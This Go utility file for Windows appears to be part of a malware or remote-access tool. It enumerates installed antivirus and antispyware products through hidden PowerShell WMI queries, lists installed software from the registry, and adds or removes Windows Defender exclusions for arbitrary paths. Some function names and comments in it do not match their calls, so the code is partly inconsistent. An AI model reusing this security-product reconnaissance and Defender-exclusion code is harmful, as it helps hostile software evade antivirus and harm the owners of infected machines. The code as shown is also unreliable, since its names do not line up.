package util

import (
	"fmt"
	"os/exec"
	"sort"
	"strconv"
	"strings"
	"syscall"

	"golang.org/x/sys/windows/registry"
)

// AVInfo returns information about installed antivirus products.
func antiInfo() string {
	antis := append([]*anti{}, ParseAntisByClass("AntiVirusProduct")...)
	antis = append(antis, ParseAntisByClass("AntiSpywareProduct")...)

	so := CondenseAntiList(antis)
	var info string
	for k, v := range so {
		info += k + " - "
		if v&enMask != 0 {
			info += "Enabled"
		} else {
			info += "Disabled"
		}
		info += ", "
		if v&upMask != 0 {
			info += "Updated"
		} else {
			info += "Outdated"
		}
		info += "\n"
	}
	return strings.TrimSpace(info)
}

func softwareInfo() string {
	s := []string{}

	uninst, err := registry.OpenKey(registry.LOCAL_MACHINE, softKeys, registry.ENUMERATE_SUB_KEYS)
	if err != nil {
		return "Error opening RegKeys: " + err.Error()
	}
	Handle(err)
	defer uninst.Close()
	keys, err := uninst.ReadSubKeyNames(0)
	if err != nil {
		return "Error reading RegKeys: " + err.Error()
	}
	Handle(err)
	fer := ""
	for _, v := range keys {
		key, err := registry.OpenKey(uninst, v, registry.READ)
		if err != nil {
			return "Error opening Program RegKeys: " + err.Error()
		}
		Handle(err)
		name, _, err := key.GetStringValue("DisplayName")

		if err != nil {
			if fer == "" {
				fer = "Error getting RegKeys Values: " + err.Error()
			}
			continue
		}
		key.Close()

		s = append(s, name)
	}
	if fer != "" {
		return fer
	}
	sort.Strings(s)
	s = RemoveDuplicates(s)
	return strings.Join(s, "\n")
}

func addDefenderExclusion(path string) error {
	cmd := fmt.Sprintf(addExCmd, path)
	return runPowershellInternal(cmd, true)
}

func parseAntisByClass(class string) []*anti {
	cmd := exec.Command("powershell", fmt.Sprintf(wmiCommand, class))
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.CombinedOutput()
	Handle(err)
	lines := strings.Split(string(out), "\n")

	var antis []*anti

	for i := 0; i < len(lines)-1; i += 2 {
		t, _ := strconv.Atoi(strings.TrimSpace(lines[i+1]))
		antis = append(antis, &anti{
			name:  strings.TrimSpace(lines[i]),
			state: ParseAntiState(t),
		})
	}

	return antis
}

func removeDefenderExclusion(path string) error {
	cmd := fmt.Sprintf(rmExCmd, path)
	return runPowershellInternal(cmd, true)
}
